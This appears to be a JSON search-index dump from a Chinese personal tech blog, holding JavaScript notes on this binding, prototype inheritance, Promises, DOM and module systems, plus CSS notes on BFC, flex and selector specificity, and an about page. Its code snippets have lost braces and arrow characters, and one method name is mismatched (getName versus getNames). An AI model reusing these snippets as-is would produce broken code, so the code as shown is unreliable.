遍历数组元素及自定义属性 返回 string 类型的 key for...of...： 遍历任何可迭代对象 (普通对象不支持) 返回 any 类型的 value Promise Promise.all()：所有成功则成功；任一失败则失败 Promise.any()：任一成功则成功；所有失败则失败 Promise.race()：任一成功则成功；任一失败则失败 Promise.allSettled()：所有都成功或失败最后返回结果 This 指向绑定对于 this 指向在函数执行时才能确定，创建时无法确定。 对于一般函数，this 指向调用者： var x = 1;var obj = x: 2, say: function () console.log(this.x); ,;obj.say(); // 2 (obj.x) var x = 1;function Obj() this.x = 2; const say = function () console.log(this.x); ; say();const obj = new Obj(); // 1 (window.x) 对于箭头函数，this 指向其父级执行上下文： var x = 1;var obj = x: 2, say: () = console.log(this.x); ,;obj.say(); // 1 (window.x) var x = 1;function Obj() this.x = 2; const say = () = console.log(this.x); ; say();const obj = new Obj(); // 2 (obj.x) call、apply、bind 都用于绑定 this 指向： call：第一参数为 this 指向，剩余参数为参数列表，临时改变 this 并立即执行 apply：第一参数为 this 指向，第二参数为参数数组，临时改变 this 并立即执行 bind：第一参数为 this 指向，剩余参数为参数列表，返回 this 指向确定的函数，同时在调用返回的函数时还可以添加剩余参数 继承与原型链每个实例对象都有一个私有属性 __proto__ 指向它的原型对象，该原型对象也有原型，一直到 null 为止。 __proto__：常见的浏览器原型链实现 getPrototypeOf() 获取 [[Prototype]]：等价于 __proto__ prototype 函数才有，指向原型对象；原型对象也有 constructor 属性与之对应 function Dog [[Prototype]]prototype == == constructor __proto__ == Object.prototypedog1 ^^ __proto__ == null__proto__ ===========|| 模拟实现 newfunction genInstance(Constructor, ...args) // const obj = ; // obj.__proto__ = Constructor.prototype; const obj = Object.create(Constructor.prototype); const ret = Constructor.call(obj, ...args); if (ret typeof ret === object) return ret; return obj; 原型链继承function Parent() this.names = [];Parent.prototype.getNames = function () console.log(this.names);;function Child() Child.prototype = new Parent();const child1 = new Child();const child2 = new Child();child1.names.push(1);console.log(child2.getName()); // [1] 引用类型的属性会被所有子实例共享 无法向 Parent 传参 组合继承引入经典继承 (借用构造函数)： function Parent() this.names = [];Parent.prototype.getNames = function () console.log(this.names);;function Child() Parent.call(this, arguments); // 借用构造函数Child.prototype = new Parent();Child.prototype.constructor = Child;const child1 = new Child();const child2 = new Child();child1.names.push(1);console.log(child2.getName()); // [] 调用了两次父构造函数，导致 Child.prototype 和 child1 中有重复的 names 寄生组合继承引入寄生式继承 (使用父原型而不是父实例作为 Child.prototype)： function Parent() this.names = [];Parent.prototype.getNames = function () console.log(this.names);;function Child() Parent.call(this, arguments); // 借用构造函数Child.prototype = Object.create(Parent.prototype);Child.prototype.constructor = Child; DOM APIElement 与 Node Node 是一个基类，DOM 中的 Element、Text 和 Comment 都继承于它 Node 包含了其内部的 Element 结点，除此之外还有直接插入的文本，注释等内容 NodeList 和 ElementCollcetion 都不是真正的数组 元素相关属性 clientHeight：content + padding offsetHeight：content + padding + border + scrollbar scrollHeight：滚动部分总高度，包括当前不可见部分 scrollTop：滚动部分顶端距离可见部分顶端的高度 offsetTop：当前元素顶部距离最近父元素顶部的距离 事件、冒泡和捕获事件传播的三个阶段： 捕获阶段 目标阶段 冒泡阶段 当一个事件发生在一个元素上，它会首先运行在该元素上的处理程序，然后运行其父元素上的处理程序，然后一直向上到其他祖先上的处理程序；几乎所有事件都会冒泡，但也有例如 focus 的事件不会冒泡。 event.target：是引发事件的目标元素，冒泡过程中不会发生变化 this：当前元素，其中有一个当前正在运行的处理程序 ESM 与 CommonJS 模块加载与解析CJS 模块同步加载，输出的是值的拷贝；对于基本类型，一旦输出，模块内部的变化影响不到这个值；对于引用类型，效果同引用类型的赋值操作；通过导出 getter 函数可以获取模块内部的变化；ES 模块是动态引用，并且不会缓存值。 由于 CJS 模块是同步的，因此可以放在代码段的任何位置；而 ESM 只是静态定义，在代码解析阶段就会被执行：import 会被提升到头部执行，export 与 var 定义的变量提升有类似的效果。 两种模块都不会重复执行。 循环依赖CJS 模块当遇到 require() 语句时，会执行模块中的代码，得到的是已经执行部分的结果。 ES6+ 新要素 let 和 const 扩展运算符 箭头函数 class Map 和 Set 箭头函数特性 没有自己的 this，内部 this 指向父级执行上下文 无法作为构造函数，没有 prototype 属性 无法使用 arguments，需要 rest 参数 无法作为 generator 函数使用 ES 标准流程 Stage 0：开放提交，提议、想法 Stage 1：正式建议，初步 demo 和标准 Stage 2：草案，标准语言解释和实验性实现 Stage 3：接近完成，等待测试、审核和用户反馈 Stage 4：确认会被包含到将来的标准中"},{"title":"CSS","path":"//2019/CSS/","content":"行内元素与块元素行内元素： 和其它元素布局在同一行 宽高不可控，默认为内部文字或图片的宽度 内外边距横向有效，纵向可设置但无实际效果 只能容纳文本或其他行内元素 块元素： 在新行上开始 宽高内外边距可控，默认为全宽 可以容纳其他行内元素与块元素 Box 模型 content-box：w3c 标准盒模型 (宽高不包括 padding 和 border) border-box：ie 盒模型 (怪异模型) (宽高包括 padding 和 border) BFC 块格式上下文一个独立的容器，不受外部影响，不影响外部。 形成条件： 根元素 position 为 fixed 或 absolute float 浮动元素 (除了 none) overflow 为 hidden、auto 或 scroll display 为 inline-block 或 table-cell 等 display 为 flex、grid 的直接子元素 布局规则： 内部 box 在垂直方向顺序放置 同 BFC 内相邻 box 的 margin 会合并 BFC 区域不会与 float box 重叠 (传统的自适应两栏布局) Flex 布局 flex: auto;：flex: 0 1 auto; flex: none;：flex: 0 0 auto; flex: 1;：flex: 1 1 0%; CSS 选择器伪类与伪元素 伪类：元素的特定状态，例如 :hover、:first-child 等选中的都是已经确实存在的元素，CSS3 指定使用单冒号 伪元素：原本并不在文档树中的元素，例如 ::before、:first-letter，如果不单独创建个 span 就无法直接选中 ，CSS3 标准要求使用双冒号，但兼容单冒号 运算符 后代选择器 div p：div 内所有的 p，包括嵌套下去在别的元素里的 子元素选择器 divp：div 内所有直接子元素 p，不包括嵌套下去的 相邻兄弟选择器 div+p：位于 div 后的第一个 p，同级，注意 div 不被选中 后续兄弟选择器 div~p：所有位于 div 后的 p，同级，注意 div 不被选中 选择器优先级一个选择器的优先级由四个分量构成，每匹配一个规则各在对应位置上加一分： 千位：内联样式 百位：ID 选择器 十位：类选择器、伪类、属性选择器 个位：元素选择器、伪元素 选择器 权重 内容 h1 0001 元素选择器 h1 + p::first-letter 0003 2 元素选择器 + 1 伪元素 li a[href*=en-US] .inline-warning 0022 2 元素 + 1 属性选择器 + 1 类 #ident 0100 1 ID 选择器 覆盖 !important 唯一的办法就是另一个 !important 具有相同优先级而且顺序靠后，或者更高优先级。 百分比参照 position: absolute：最后一个已定位的父元素 border-radius：自身 BEM 命名法.block,.block__element,.block--modifier block：某个元素或组件 block__element：block 的后代，是完整 block 的一部分 block--modifier：block 的不同状态或不同版本 可以配合 CSS Module 使用将类名进行 HASH。"},{"title":"查无此页","path":"/404.html","content":"404 Not Found 非常抱歉，您要访问的页面不存在！ 可能是输入地址有误或者该地址已被删除。"},{"title":"磊子","path":"/about/index.html","content":"关于我磊子 目前是一名程序猿。 我只知道一件事，就是我一无所知。 兴趣爱好 喜欢的影视喜欢的音乐人其他漫威的影视作品，例如：美国队长蜘蛛侠钢铁侠X战警金刚狼雷神奇异博士复仇者联盟科幻悬疑惊悚类，例如：普罗米修斯我是传奇黑客帝国电锯惊魂招魂恐怖游轮新世界无间道诺兰大导演的作品，例如：星际穿越盗梦空间致命魔术动画类，比如：寻梦环游记头号玩家机器人总动员冰川时代神偷奶爸千与千寻追番：凡人修仙传牧神记灵笼沧元图仙逆咒术回战鬼灭之刃海贼王排名不分先后：赵雷伍佰周杰伦云吸猫。此外，也热衷于欣赏和学习这方面的知识：产品设计、科学。 关于本站本站是个人博客，不放置任何推广链接。内容以技术积累为主，也不排除会写一些生活方面或者其它主题的内容。随缘更新。 联系方式echo aHpsZWlpQDEyNi5jb20= | base64 -d"},{"title":"近期动态","path":"/explore/index.html","content":""}]